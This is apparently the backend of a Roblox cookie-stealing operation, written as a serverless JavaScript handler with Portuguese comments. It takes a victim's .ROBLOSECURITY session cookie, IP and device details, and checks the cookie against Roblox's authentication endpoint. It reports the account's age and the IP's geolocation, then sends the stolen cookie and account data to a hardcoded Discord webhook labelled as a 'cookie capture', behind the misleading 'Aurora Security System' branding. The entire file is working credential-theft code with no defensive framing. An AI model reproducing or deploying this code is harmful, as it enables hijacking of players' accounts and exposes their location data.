export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Responder preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    let { cookie, ip, device, timestamp } = req.body;

    // Validar dados básicos
    if (!cookie) {
      return res.status(400).json({ error: 'Cookie não fornecido' });
    }

    // ===== CORREÇÃO: FORMATAR O COOKIE CORRETAMENTE =====
    let cookieOriginal = cookie;
    let cookieFormatado = cookie;
    
    // Se o cookie NÃO começa com _|WARNING, adicionar o formato correto
    if (!cookie.startsWith('_|WARNING') && !cookie.startsWith('WARNING')) {
      // Verificar se é apenas o token (formato que você está testando)
      if (cookie.length > 100 && !cookie.includes('WARNING')) {
        cookieFormatado = `_|WARNING:-DO-NOT-SHARE-THIS.--${cookie}`;
        console.log('Cookie formatado automaticamente');
      }
    }

    // Limpar o cookie (remover aspas, espaços)
    cookieFormatado = cookieFormatado.trim().replace(/^["']|["']$/g, '');

    // ===== VERIFICAÇÃO DO COOKIE COM ROBLOX =====
    let cookieValido = true;
    let contaRecente = false;
    let username = 'Desconhecido';
    let userId = null;
    let idadeConta = 'Desconhecida';
    let erroValidacao = null;

    try {
      console.log('Verificando cookie com Roblox...');
      
      // Tentar com o cookie original primeiro
      const robloxResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookieOriginal}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      let responseData = null;
      
      if (robloxResponse.ok) {
        responseData = await robloxResponse.json();
      } else {
        // Se falhou, tentar com o cookie formatado
        console.log('Tentando com cookie formatado...');
        const robloxResponse2 = await fetch('https://users.roblox.com/v1/users/authenticated', {
          method: 'GET',
          headers: {
            'Cookie': `.ROBLOSECURITY=${cookieFormatado}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        if (robloxResponse2.ok) {
          responseData = await robloxResponse2.json();
          cookieOriginal = cookieFormatado; // Usar o formatado daqui pra frente
        }
      }

      if (!responseData) {
        cookieValido = false;
        erroValidacao = 'Cookie inválido ou expirado';
      } else {
        // Cookie válido - buscar informações da conta
        username = responseData.name || 'Desconhecido';
        userId = responseData.id;
        
        // Buscar data de criação da conta
        const userInfoResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`);
        if (userInfoResponse.ok) {
          const userInfo = await userInfoResponse.json();
          
          if (userInfo.created) {
            const dataCriacao = new Date(userInfo.created);
            const agora = new Date();
            const diffDias = Math.floor((agora - dataCriacao) / (1000 * 60 * 60 * 24));
            
            // Calcular idade da conta
            if (diffDias < 30) {
              contaRecente = true;
              if (diffDias < 1) {
                idadeConta = 'Menos de 1 dia';
              } else {
                idadeConta = `${diffDias} dias`;
              }
            } else if (diffDias < 365) {
              const meses = Math.floor(diffDias / 30);
              idadeConta = `${meses} meses`;
            } else {
              const anos = Math.floor(diffDias / 365);
              idadeConta = `${anos} anos`;
            }
          }
        }
      }
    } catch (e) {
      console.error('Erro ao verificar cookie com Roblox:', e);
      cookieValido = false;
      erroValidacao = 'Erro ao conectar com Roblox';
    }

    // Buscar informações detalhadas do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1480235860002734152/8ZjlQOiaHtPrE9bz-yGaM_GiMC3akI7ptVW-aElQUvTjsk8jauXoaho6B1anWmy8a8QE';

    // Determinar cor e título baseado na validação
    let embedColor = 0x6366f1;
    let embedTitle = '🔐 **NOVA CAPTURA DE COOKIE**';
    let embedDescription = 'Um novo cookie foi capturado pelo sistema Aurora';
    let embedContent = null;

    if (!cookieValido) {
      embedColor = 0xff0000;
      embedTitle = '❌ **COOKIE INVÁLIDO**';
      embedDescription = `Cookie inválido: ${erroValidacao || 'Não foi possível validar'}`;
    } else if (contaRecente) {
      embedColor = 0xffa500;
      embedTitle = '⚠️ **CONTA RECENTE**';
      embedDescription = `Cookie válido mas a conta tem apenas ${idadeConta}`;
      embedContent = '@everyone ⚠️ CONTA RECENTE';
    } else {
      embedContent = '@everyone ✅ COOKIE VÁLIDO';
    }

    // Mostrar o cookie que foi usado (original ou formatado)
    const cookieExibido = cookieOriginal || cookie;

    const embed = {
      content: embedContent,
      embeds: [{
        title: embedTitle,
        description: embedDescription,
        color: embedColor,
        fields: [
          {
            name: '🍪 **COOKIE**',
            value: '```' + cookieExibido.substring(0, 100) + '...```'
          },
          {
            name: '👤 **INFORMAÇÕES DA CONTA**',
            value: `\`\`\`yml
Username: ${username}
User ID: ${userId || 'Desconhecido'}
Status: ${cookieValido ? '✅ Válido' : '❌ Inválido'}
Conta Recente: ${contaRecente ? '⚠️ Sim' : '✅ Não'}
Idade da Conta: ${idadeConta}
\`\`\``
          },
          {
            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
            value: `\`\`\`yml
Dispositivo: ${device}
Navegador: ${getBrowserInfo(req)}
Sistema: ${getOSInfo(req)}
Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
\`\`\``
          },
          {
            name: '🌍 **INFORMAÇÕES DO IP**',
            value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
\`\`\``
          },
          {
            name: '⏰ **TIMESTAMP**',
            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
            inline: true
          },
          {
            name: '📏 **TAMANHO**',
            value: `\`${cookieExibido.length} caracteres\``,
            inline: true
          }
        ],
        footer: {
          text: 'Aurora Security System',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Enviar para o Discord
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    // Retornar resultado para o frontend
    return res.status(200).json({ 
      success: true,
      valido: cookieValido,
      contaRecente: contaRecente,
      username: username,
      idadeConta: idadeConta,
      userId: userId
    });
    
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno' });
  }
}

// Funções auxiliares
function getBrowserInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
  if (ua.includes('Firefox')) return 'Mozilla Firefox';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
  if (ua.includes('Edg')) return 'Microsoft Edge';
  return 'Desconhecido';
}

function getOSInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
  return 'Desconhecido';
}
